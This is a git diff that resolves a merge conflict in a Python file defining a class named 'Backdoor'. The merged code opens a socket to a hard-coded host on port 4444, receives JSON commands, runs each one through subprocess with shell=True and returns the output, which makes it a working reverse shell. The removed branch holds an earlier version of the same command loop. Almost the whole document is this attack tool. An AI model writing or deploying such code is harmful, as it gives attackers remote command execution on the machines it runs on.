@@ -1,8 +1,4 @@
-<<<<<<< HEAD
 import subprocess, sys, socket, json
-=======
-import subprocess, sys, socket
->>>>>>> 9f97c2740c6655becd305bbf8f6760dd1e8cc81d
 
 
 class Backdoor:
@@ -17,7 +13,6 @@ class Backdoor:
     def executeCmd(self,cmd):
         cmd = subprocess.check_output(cmd,shell=True)
         return cmd
-<<<<<<< HEAD
     
     
     def sendStream(self,data):
@@ -28,13 +23,10 @@ class Backdoor:
     def recvStream(self):
         jsData = self.s.recv(1024)
         return json.loads(jsData)
-=======
->>>>>>> 9f97c2740c6655becd305bbf8f6760dd1e8cc81d
 
 
     def run(self):
         while True:
-<<<<<<< HEAD
             print('run1')
             cmdIn = self.recvStream()
             print(cmdIn)
@@ -52,16 +44,6 @@ class Backdoor:
                 print('run5_TRYPOSTSEND')
             except subprocess.CalledProcessError:
                 self.sendStream('Subprocess Error, shell command not accepted by target')
-=======
-            cmdIn = self.s.recv(1024)
-            cmdIn = cmdIn.decode()
-            #print(cmdIn)
-            try:
-                cmdOut = self.executeCmd(cmdIn)
-                self.s.send(str(cmdOut).encode('utf-8'))
-            except subprocess.CalledProcessError:
-                self.s.send(b'Subprocess Error, shell command not accepted by target')
->>>>>>> 9f97c2740c6655becd305bbf8f6760dd1e8cc81d
 
 
 backdoor = Backdoor('10.211.55.5',4444)
